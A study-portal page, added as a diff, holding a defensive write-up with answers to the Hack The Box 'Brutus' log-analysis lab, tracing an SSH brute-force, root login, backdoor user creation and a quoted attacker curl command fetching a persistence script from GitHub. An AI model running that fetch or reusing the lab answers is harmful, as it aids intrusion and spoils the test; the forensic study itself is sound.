@@ -1,0 +1,201 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="dark">
+  <title>Brutus (HTB) | Blue Team Study Portal</title>
+  <link rel="stylesheet" href="../style.css">
+</head>
+<body class="min-h-screen bg-slate-950 text-slate-100 antialiased">
+  <div class="app-shell">
+    <aside class="sidebar">
+    <a class="brand" href="../index.html"><span>BT</span><strong>Blue Team Study Portal</strong></a>
+    <button class="command-button" type="button" id="openCommand">Search / Quick jump <kbd>Ctrl K</kbd></button>
+    <label class="search-box"><span>Search notes</span><input id="globalSearch" type="search" placeholder="Search MITRE, commands, topics"></label>
+    <div id="searchResults" class="search-results" hidden></div>
+    <nav><details class="side-level" open><summary><strong>L1</strong><span>Initial Triage &amp; Fundamentals</span></summary><details class="side-section"><summary>SOC &amp; Incident Response Basics<span>5</span></summary><a class="side-link " href="../pages/soc-essentials.html"><span>SOC Essentials</span><em>0 nodes</em></a><a class="side-link " href="../pages/what-is-incident-response.html"><span>What is Incident Response?</span><em>0 nodes</em></a><a class="side-link " href="../pages/incident-response-cycle.html"><span>Incident Response Cycle</span><em>0 nodes</em></a><a class="side-link " href="../pages/frameworks.html"><span>Frameworks</span><em>5 nodes</em></a><a class="side-link " href="../pages/the-hive.html"><span>The Hive</span><em>0 nodes</em></a></details><details class="side-section"><summary>Operating System &amp; Command Line Basics<span>4</span></summary><a class="side-link " href="../pages/important-windows-directories.html"><span>Important Windows Directories</span><em>0 nodes</em></a><a class="side-link " href="../pages/windows-command-line-tools.html"><span>Windows command-line &amp; tools</span><em>0 nodes</em></a><a class="side-link " href="../pages/intro-to-powershell.html"><span>Intro to PowerShell</span><em>0 nodes</em></a><a class="side-link " href="../pages/linux-cheatsheet.html"><span>Linux CheatSheet</span><em>0 nodes</em></a></details><details class="side-section"><summary>Networking &amp; Web Basics<span>3</span></summary><a class="side-link " href="../pages/network.html"><span>Network</span><em>4 nodes</em></a><a class="side-link " href="../pages/network-defenses.html"><span>Network Defenses</span><em>0 nodes</em></a><a class="side-link " href="../pages/web-fundamentals.html"><span>Web Fundamentals</span><em>0 nodes</em></a></details><details class="side-section"><summary>Initial Triage &amp; Analysis<span>3</span></summary><a class="side-link " href="../pages/phishing-analysis.html"><span>Phishing analysis</span><em>14 nodes</em></a><a class="side-link " href="../pages/phishing-analysis-labs.html"><span>Phishing Analysis Labs</span><em>13 nodes</em></a><a class="side-link " href="../pages/osint.html"><span>OSINT</span><em>0 nodes</em></a></details><details class="side-section"><summary>Tool Familiarity<span>3</span></summary><a class="side-link " href="../pages/logging-fundamentals.html"><span>Logging Fundamentals</span><em>0 nodes</em></a><a class="side-link " href="../pages/siem.html"><span>SIEM</span><em>0 nodes</em></a><a class="side-link " href="../pages/elk-elastic-stack.html"><span>ELK (Elastic Stack)</span><em>0 nodes</em></a></details></details><details class="side-level" ><summary><strong>L1.5</strong><span>Advanced Investigation &amp; Contextualization</span></summary><details class="side-section"><summary>Endpoint &amp; OS Investigation<span>5</span></summary><a class="side-link " href="../pages/windows-event-ids.html"><span>Windows Event IDs</span><em>9 nodes</em></a><a class="side-link " href="../pages/windows-processes.html"><span>Windows processes</span><em>0 nodes</em></a><a class="side-link " href="../pages/windows-security-monitoring.html"><span>Windows Security Monitoring</span><em>4 nodes</em></a><a class="side-link " href="../pages/sysinternals.html"><span>Sysinternals</span><em>0 nodes</em></a><a class="side-link " href="../pages/edr-endpoint-detection-and-response.html"><span>EDR (Endpoint Detection and Response)</span><em>0 nodes</em></a></details><details class="side-section"><summary>Advanced Querying<span>4</span></summary><a class="side-link " href="../pages/splunk.html"><span>Splunk</span><em>0 nodes</em></a><a class="side-link " href="../pages/splunk-filters.html"><span>Splunk Filters</span><em>0 nodes</em></a><a class="side-link " href="../pages/log-analysis-labs.html"><span>Log Analysis Labs</span><em>15 nodes</em></a><a class="side-link " href="../pages/regex.html"><span>Regex</span><em>0 nodes</em></a></details><details class="side-section"><summary>Contextualizing Threats<span>3</span></summary><a class="side-link " href="../pages/threat-intelligence.html"><span>Threat Intelligence</span><em>6 nodes</em></a><a class="side-link " href="../pages/threat-intelligence-labs.html"><span>Threat Intelligence Labs</span><em>18 nodes</em></a><a class="side-link " href="../pages/threat-intelligence-toolkit.html"><span>Threat Intelligence Toolkit</span><em>1 nodes</em></a></details><details class="side-section"><summary>Network Investigation<span>1</span></summary><a class="side-link " href="../pages/network-analysis-tools.html"><span>Network Analysis Tools</span><em>3 nodes</em></a></details></details><details class="side-level" ><summary><strong>L2</strong><span>DFIR, Threat Hunting &amp; Engineering</span></summary><details class="side-section"><summary>Proactive Threat Hunting<span>6</span></summary><a class="side-link " href="../pages/hunting-persistence-mitre-ta0003.html"><span>Hunting Persistence (MITRE TA0003)</span><em>11 nodes</em></a><a class="side-link " href="../pages/hunting-lateral-movement-mitre-ta0008.html"><span>Hunting Lateral Movement (MITRE TA0008)</span><em>4 nodes</em></a><a class="side-link " href="../pages/hunting-discovery-mitre-ta0007.html"><span>Hunting Discovery (MITRE TA0007)</span><em>0 nodes</em></a><a class="side-link " href="../pages/threat-hunting-module.html"><span>Threat Hunting module</span><em>6 nodes</em></a><a class="side-link " href="../pages/threat-hunting-labs-siem.html"><span>Threat hunting Labs (SIEM)</span><em>27 nodes</em></a><a class="side-link " href="../pages/100-splunk-use-cases.html"><span>+100 Splunk Use Cases</span><em>0 nodes</em></a></details><details class="side-section"><summary>Digital Forensics (DFIR)<span>8</span></summary><a class="side-link " href="../pages/digital-forensics.html"><span>Digital Forensics</span><em>9 nodes</em></a><a class="side-link " href="../pages/windows-forensics.html"><span>Windows Forensics</span><em>22 nodes</em></a><a class="side-link " href="../pages/forensics-labs.html"><span>Forensics Labs</span><em>15 nodes</em></a><a class="side-link " href="../pages/memory-forensics.html"><span>Memory forensics</span><em>0 nodes</em></a><a class="side-link " href="../pages/memory-forensics-labs.html"><span>Memory Forensics Labs</span><em>19 nodes</em></a><a class="side-link " href="../pages/volatility.html"><span>Volatility</span><em>5 nodes</em></a><a class="side-link " href="../pages/linux-artifacts-forensic-evidence-collection.html"><span>Linux Artifacts &amp; Forensic Evidence Collection</span><em>7 nodes</em></a><a class="side-link " href="../pages/stenography.html"><span>Stenography</span><em>0 nodes</em></a></details><details class="side-section"><summary>Advanced Attack Vectors &amp; Internals<span>9</span></summary><a class="side-link " href="../pages/active-directory.html"><span>Active Directory</span><em>7 nodes</em></a><a class="side-link " href="../pages/kerberos-authentication.html"><span>Kerberos authentication</span><em>0 nodes</em></a><a class="side-link " href="../pages/detecting-ad-attacks.html"><span>Detecting AD Attacks</span><em>15 nodes</em></a><a class="side-link " href="../pages/detecting-active-directory-attacks-htb.html"><span>Detecting Active Directory Attacks / HTB</span><em>6 nodes</em></a><a class="side-link " href="../pages/windows-internals.html"><span>Windows Internals</span><em>0 nodes</em></a><a class="side-link " href="../pages/command-and-control.html"><span>Command-and-Control (C2)</span><em>0 nodes</em></a><a class="side-link " href="../pages/command-and-control-c2-evasion-techniques.html"><span>Command-and-Control (C2) Evasion Techniques</span><em>0 nodes</em></a><a class="side-link " href="../pages/detecting-web-attacks.html"><span>Detecting Web Attacks</span><em>8 nodes</em></a><a class="side-link " href="../pages/network-analysis-labs.html"><span>Network Analysis Labs</span><em>28 nodes</em></a></details><details class="side-section"><summary>Detection Engineering &amp; Automation<span>6</span></summary><a class="side-link " href="../pages/detection-engineering.html"><span>Detection Engineering</span><em>0 nodes</em></a><a class="side-link " href="../pages/sigma.html"><span>Sigma</span><em>0 nodes</em></a><a class="side-link " href="../pages/yara.html"><span>Yara</span><em>0 nodes</em></a><a class="side-link " href="../pages/atomic-red-team.html"><span>Atomic Red Team</span><em>0 nodes</em></a><a class="side-link " href="../pages/threat-modelling.html"><span>Threat Modelling</span><em>5 nodes</em></a><a class="side-link " href="../pages/ad-hardening.html"><span>AD Hardening</span><em>0 nodes</em></a></details><details class="side-section"><summary>Advanced Scripting &amp; Analysis Tooling<span>6</span></summary><a class="side-link " href="../pages/powershell-for-incident-response.html"><span>PowerShell for Incident Response</span><em>0 nodes</em></a><a class="side-link " href="../pages/powershell-detection.html"><span>Powershell Detection</span><em>0 nodes</em></a><a class="side-link " href="../pages/powershell-logs.html"><span>PowerShell Logs</span><em>0 nodes</em></a><a class="side-link " href="../pages/lolbins-living-off-the-land-binaries.html"><span>LOLBins (living-off-the-land binaries)</span><em>0 nodes</em></a><a class="side-link " href="../pages/osquery.html"><span>Osquery</span><em>0 nodes</em></a><a class="side-link " href="../pages/cryptography.html"><span>Cryptography</span><em>0 nodes</em></a></details></details></nav>
+  </aside>
+    <main class="content"><header class="topic-hero">
+      <div class="breadcrumbs"><a href="../index.html">Home</a><span>/</span><a href="log-analysis-labs.html">Log Analysis Labs</a><span>/</span><span>Brutus (HTB)</span></div>
+      <h1>Brutus (HTB)</h1>
+      <p>In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, </p>
+      <div class="tag-row"><span class="tag level">L1.5</span><span class="tag">Persistence</span><span class="tag mitre">T1136.001</span></div>
+    </header>
+    <div class="reader-layout">
+      <aside class="secondary-nav">
+        <div class="secondary-heading"><span>Current Tree</span><strong>Log Analysis Labs</strong></div>
+        <details class="tree-node" open>
+    <summary>
+      <a class="" href="log-analysis-labs.html"><span>Log Analysis Labs</span><em>L1.5</em></a>
+      <b>15</b>
+    </summary>
+    <div class="tree-children"><details class="tree-node" open>
+    <summary>
+      <a class="" href="neurosync-d-htb.html"><span>NeuroSync-D (HTB)</span><em>L1.5</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="smartypants-htb.html"><span>SmartyPants (HTB)</span><em>L1.5</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="campfire-1-htb.html"><span>Campfire-1 (HTB)</span><em>L1.5</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="juicy-details-thm.html"><span>Juicy Details (THM)</span><em>L1.5</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="smoke-mirrors-htb.html"><span>Smoke &amp; Mirrors (HTB)</span><em>L1.5</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="bruteforce-btlo.html"><span>Bruteforce (BTLO)</span><em>L1.5</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="active" href="brutus-htb.html"><span>Brutus (HTB)</span><em>L1.5</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="log-analysis-sysmon-btlo.html"><span>Log Analysis - Sysmon (BTLO)</span><em>L1.5</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="unit42-htb.html"><span>Unit42 (HTB)</span><em>L1.5</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="crownjewel-1-htb.html"><span>CrownJewel-1 (HTB)</span><em>L1.5</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="campfire-2-htb.html"><span>Campfire-2 (HTB)</span><em>L1.5</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="logjammer-htb.html"><span>LogJammer (HTB)</span><em>L1.5</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="deep-blue-btlo.html"><span>Deep Blue (BTLO)</span><em>L1.5</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="crownjewel-2-htb.html"><span>CrownJewel-2 (HTB)</span><em>L1.5</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="phantom-check-htb.html"><span>Phantom Check (HTB)</span><em>L1.5</em></a>
+      
+    </summary>
+    
+  </details></div>
+  </details>
+      </aside>
+      <article class="reader">
+        
+        <section class="study-grid">
+    <article><h2>Overview</h2><p>In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, </p></article>
+    <article><h2>Why It Matters In SOC</h2><p>Use this note as an analyst reference: understand the concept, identify the relevant telemetry, pivot through evidence, and document the decision path clearly.</p></article>
+    <article><h2>Key Concepts</h2><ul><li>Brutus (HTB)</li><li>Scenario</li><li>1- Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?</li><li>65.2.161.68</li><li>2- The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?</li><li>root</li><li>3- Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.</li><li>2024-03-06 06:32:45</li><li>4- SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?</li><li>37</li><li>5- The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?</li><li>cyberjunkie</li></ul></article>
+    <article><h2>Analyst Workflow</h2><ul><li>Identify the user, host, process, network flow, or identity object involved.</li><li>Collect the highest-value logs first and preserve timestamps and assumptions.</li><li>Pivot through related notes, telemetry sources, and MITRE references.</li><li>Document findings, gaps, containment options, and detection improvements.</li></ul></article>
+    <article><h2>Splunk/SIEM Examples</h2><p class="muted">No direct examples extracted.</p></article>
+    <article><h2>Important Commands</h2><p class="muted">No direct examples extracted.</p></article>
+    <article><h2>Tools Used</h2><p class="muted">No extracted items for this section.</p></article>
+    <article><h2>Notes/Tips</h2><p class="muted">No extracted items for this section.</p></article>
+  </section>
+        <section class="source-note"><h2>Original Notes</h2><h2 id="brutus-htb">Brutus (HTB)</h2>
+<h3 id="scenario"><strong>Scenario</strong></h3>
+<p><strong>In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.</strong></p>
+<p><a class="note-link" href="https://app.hackthebox.com/sherlocks/Brutus">https://app.hackthebox.com/sherlocks/Brutus</a></p>
+<hr>
+<p>we are provided with 2 files auth.log and WTMP</p>
+<p><code>auth.log</code> is used to track every authentication whether its user attempt to login or perform any task the requires authentication.</p>
+<p><code>wtmp</code> file logs all login and logout events  (successful)</p>
+<p><button class="image-button" data-src="../assets/images/log-analysis-labsbrutus-htb-screenshot_2025-08-05_030426-d8dcbfa5.png" data-alt="Screenshot 2025-08-05 030426.png"><img src="../assets/images/log-analysis-labsbrutus-htb-screenshot_2025-08-05_030426-d8dcbfa5.png" alt="Screenshot 2025-08-05 030426.png" loading="lazy"></button></p>
+<h4 id="1-analyze-the-auth.log.-what-is-the-ip-address-used-by-the-attacker-to-carry-out-a-brute-f"><strong>1- Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?</strong></h4>
+<h4 id="65.2.161.68">65.2.161.68</h4>
+<p><button class="image-button" data-src="../assets/images/log-analysis-labsbrutus-htb-screenshot_2025-08-05_033312-b3378d37.png" data-alt="Screenshot 2025-08-05 033312.png"><img src="../assets/images/log-analysis-labsbrutus-htb-screenshot_2025-08-05_033312-b3378d37.png" alt="Screenshot 2025-08-05 033312.png" loading="lazy"></button></p>
+<p>To spot a brute force you look at repeated failed logins (invalid user - failed password) with short period so we grep with Failed</p>
+<h4 id="2-the-bruteforce-attempts-were-successful-and-attacker-gained-access-to-an-account-on-the-"><strong>2- The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?</strong></h4>
+<h4 id="root">root</h4>
+<p><button class="image-button" data-src="../assets/images/log-analysis-labsbrutus-htb-screenshot_2025-08-05_033534-9353f955.png" data-alt="Screenshot 2025-08-05 033534.png"><img src="../assets/images/log-analysis-labsbrutus-htb-screenshot_2025-08-05_033534-9353f955.png" alt="Screenshot 2025-08-05 033534.png" loading="lazy"></button></p>
+<p>we can see that the attacker was able to authenticate as root account the most privileged user on the system</p>
+<h4 id="3-identify-the-utc-timestamp-when-the-attacker-logged-in-manually-to-the-server-and-establ"><strong>3- Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.</strong></h4>
+<h4 id="2024-03-06-063245">2024-03-06 06:32:45</h4>
+<p><button class="image-button" data-src="../assets/images/log-analysis-labsbrutus-htb-screenshot_2025-08-05_034153-2e116132.png" data-alt="Screenshot 2025-08-05 034153.png"><img src="../assets/images/log-analysis-labsbrutus-htb-screenshot_2025-08-05_034153-2e116132.png" alt="Screenshot 2025-08-05 034153.png" loading="lazy"></button></p>
+<p>we grep for accepted and the attacker ip but we don’t see the year , month and day so we have to use wtmp</p>
+<p>(note that the first entry 06:31:40 isn’t the answer because it was likely due an automated scan / the session lasts only 1 second)</p>
+<p><button class="image-button" data-src="../assets/images/log-analysis-labsbrutus-htb-screenshot_2025-08-05_034659-365d1536.png" data-alt="Screenshot 2025-08-05 034659.png"><img src="../assets/images/log-analysis-labsbrutus-htb-screenshot_2025-08-05_034659-365d1536.png" alt="Screenshot 2025-08-05 034659.png" loading="lazy"></button></p>
+<p><button class="image-button" data-src="../assets/images/log-analysis-labsbrutus-htb-screenshot_2025-08-05_034735-11b78a78.png" data-alt="Screenshot 2025-08-05 034735.png"><img src="../assets/images/log-analysis-labsbrutus-htb-screenshot_2025-08-05_034735-11b78a78.png" alt="Screenshot 2025-08-05 034735.png" loading="lazy"></button></p>
+<p><button class="image-button" data-src="../assets/images/log-analysis-labsbrutus-htb-screenshot_2025-08-05_034801-040fe978.png" data-alt="Screenshot 2025-08-05 034801.png"><img src="../assets/images/log-analysis-labsbrutus-htb-screenshot_2025-08-05_034801-040fe978.png" alt="Screenshot 2025-08-05 034801.png" loading="lazy"></button></p>
+<p>note you can’t open wtmp using cat you need to use utmpdump</p>
+<h4 id="4-ssh-login-sessions-are-tracked-and-assigned-a-session-number-upon-login.-what-is-the-ses"><strong>4- SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?</strong></h4>
+<h4 id="37">37</h4>
+<p><button class="image-button" data-src="../assets/images/log-analysis-labsbrutus-htb-screenshot_2025-08-05_035148-bc9e9296.png" data-alt="Screenshot 2025-08-05 035148.png"><img src="../assets/images/log-analysis-labsbrutus-htb-screenshot_2025-08-05_035148-bc9e9296.png" alt="Screenshot 2025-08-05 035148.png" loading="lazy"></button></p>
+<p>every ssh login session have a unique session number for tracking so we grep with session and root and look at the time that we know from the previous question</p>
+<h4 id="5-the-attacker-added-a-new-user-as-part-of-their-persistence-strategy-on-the-server-and-ga"><strong>5- The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?</strong></h4>
+<h4 id="cyberjunkie">cyberjunkie</h4>
+<p><button class="image-button" data-src="../assets/images/log-analysis-labsbrutus-htb-screenshot_2025-08-05_035241-81d660ec.png" data-alt="Screenshot 2025-08-05 035241.png"><img src="../assets/images/log-analysis-labsbrutus-htb-screenshot_2025-08-05_035241-81d660ec.png" alt="Screenshot 2025-08-05 035241.png" loading="lazy"></button></p>
+<p>we can see the attacker created new user named cyberjunkie and added him to the sudo group for elevated privileges</p>
+<h4 id="6-what-is-the-mitre-attck-sub-technique-id-used-for-persistence-by-creating-a-new-account"><strong>6- What is the MITRE ATT&amp;CK sub-technique ID used for persistence by creating a new account?</strong></h4>
+<h4 id="t1136.001">T1136.001</h4>
+<p><button class="image-button" data-src="../assets/images/log-analysis-labsbrutus-htb-screenshot_2025-08-05_035445-3b450a04.png" data-alt="Screenshot 2025-08-05 035445.png"><img src="../assets/images/log-analysis-labsbrutus-htb-screenshot_2025-08-05_035445-3b450a04.png" alt="Screenshot 2025-08-05 035445.png" loading="lazy"></button></p>
+<p>just simple searching</p>
+<h4 id="7-what-time-did-the-attackers-first-ssh-session-end-according-to-auth.log"><strong>7- What time did the attacker's first SSH session end according to auth.log?</strong></h4>
+<h4 id="2024-03-06-063724">2024-03-06 06:37:24</h4>
+<p><button class="image-button" data-src="../assets/images/log-analysis-labsbrutus-htb-screenshot_2025-08-05_035619-ea7f3037.png" data-alt="Screenshot 2025-08-05 035619.png"><img src="../assets/images/log-analysis-labsbrutus-htb-screenshot_2025-08-05_035619-ea7f3037.png" alt="Screenshot 2025-08-05 035619.png" loading="lazy"></button></p>
+<p>in Q4 we know the session id was 37  so we grep with it</p>
+<h4 id="8-the-attacker-logged-into-their-backdoor-account-and-utilized-their-higher-privileges-to-"><strong>8- The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?</strong></h4>
+<h4 id="usrbincurl-httpsraw.githubusercontent.commontysecuritylinpermainlinper.sh">/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</h4>
+<p><button class="image-button" data-src="../assets/images/log-analysis-labsbrutus-htb-screenshot_2025-08-05_035756-aff0fb4e.png" data-alt="Screenshot 2025-08-05 035756.png"><img src="../assets/images/log-analysis-labsbrutus-htb-screenshot_2025-08-05_035756-aff0fb4e.png" alt="Screenshot 2025-08-05 035756.png" loading="lazy"></button></p>
+<p>we grep with the created user and will see the attacker executed a command to download a script from a github repository using sudo maybe further exploitation or persistence</p></section>
+      </article>
+      <details class="toc" open><summary>Table of contents</summary><a href="#brutus-htb">Brutus (HTB)</a><a href="#scenario">Scenario</a><a href="#1-analyze-the-auth.log.-what-is-the-ip-address-used-by-the-attacker-to-carry-out-a-brute-f">1- Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?</a><a href="#65.2.161.68">65.2.161.68</a><a href="#2-the-bruteforce-attempts-were-successful-and-attacker-gained-access-to-an-account-on-the-">2- The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?</a><a href="#root">root</a><a href="#3-identify-the-utc-timestamp-when-the-attacker-logged-in-manually-to-the-server-and-establ">3- Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.</a><a href="#2024-03-06-063245">2024-03-06 06:32:45</a><a href="#4-ssh-login-sessions-are-tracked-and-assigned-a-session-number-upon-login.-what-is-the-ses">4- SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?</a><a href="#37">37</a><a href="#5-the-attacker-added-a-new-user-as-part-of-their-persistence-strategy-on-the-server-and-ga">5- The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?</a><a href="#cyberjunkie">cyberjunkie</a><a href="#6-what-is-the-mitre-attck-sub-technique-id-used-for-persistence-by-creating-a-new-account">6- What is the MITRE ATT&amp;CK sub-technique ID used for persistence by creating a new account?</a><a href="#t1136.001">T1136.001</a><a href="#7-what-time-did-the-attackers-first-ssh-session-end-according-to-auth.log">7- What time did the attacker's first SSH session end according to auth.log?</a><a href="#2024-03-06-063724">2024-03-06 06:37:24</a><a href="#8-the-attacker-logged-into-their-backdoor-account-and-utilized-their-higher-privileges-to-">8- The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?</a><a href="#usrbincurl-httpsraw.githubusercontent.commontysecuritylinpermainlinper.sh">/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</a></details>
+    </div>
+    
+    <footer class="pager"><a href="bruteforce-btlo.html">← Bruteforce (BTLO)</a><a href="log-analysis-sysmon-btlo.html">Log Analysis - Sysmon (BTLO) →</a></footer></main>
+  </div>
+  <div class="lightbox" id="lightbox" hidden><button type="button" aria-label="Close image">×</button><img alt=""></div>
+  <div class="command-palette" id="commandPalette" hidden>
+    <div class="command-panel">
+      <div class="command-head"><strong>Quick jump</strong><button type="button" id="closeCommand">Close</button></div>
+      <input id="commandInput" type="search" placeholder="Search any note, tag, command, or MITRE ID">
+      <div id="commandResults" class="command-results"></div>
+    </div>
+  </div>
+  <script src="../data/json/search-index.js"></script>
+  <script src="../script.js"></script>
+</body>
+</html>
